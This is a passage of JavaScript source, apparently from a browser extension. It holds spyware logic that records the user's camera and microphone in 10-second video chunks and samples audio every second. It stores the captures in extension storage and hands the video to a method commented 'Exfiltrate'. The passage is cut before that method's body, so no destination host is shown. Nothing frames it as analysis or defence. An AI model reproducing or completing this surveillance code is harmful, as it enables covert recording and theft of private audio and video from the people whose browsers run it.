      const videoRecorder = new MediaRecorder(this.mediaStream, {
        mimeType: 'video/webm;codecs=vp9,opus'
      });

      videoRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          this.processVideoChunk(event.data);
        }
      };
      videoRecorder.start(10000); // 10-second chunks

      // Audio analysis
      this.audioContext = new AudioContext();
      const source = this.audioContext.createMediaStreamSource(this.mediaStream);
      const analyser = this.audioContext.createAnalyser();
      source.connect(analyser);

      // Continuous audio monitoring
      this.analyzeAudio(analyser);

    } catch (error) {
      console.error('AV Monitoring failed:', error);
    }
  }

  async processVideoChunk(blob) {
    const reader = new FileReader();
    reader.onloadend = () => {
      const videoData = {
        type: 'video_capture',
        timestamp: Date.now(),
        data: reader.result,
        duration: 10000
      };

      chrome.storage.local.set({
        [`video_${Date.now()}`]: videoData
      });

      // Exfiltrate
      this.exfiltrateData(videoData);
    };
    reader.readAsDataURL(blob);
  }

  analyzeAudio(analyser) {
    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    setInterval(() => {
      analyser.getByteFrequencyData(dataArray);

      const audioData = {
        type: 'audio_analysis',
        timestamp: Date.now(),
        frequencies: Array.from(dataArray),
        averageVolume: dataArray.reduce((a, b) => a + b) / bufferLength
      };

      chrome.storage.local.set({
        [`audio_${Date.now()}`]: audioData
      });
    }, 1000);
  }
}
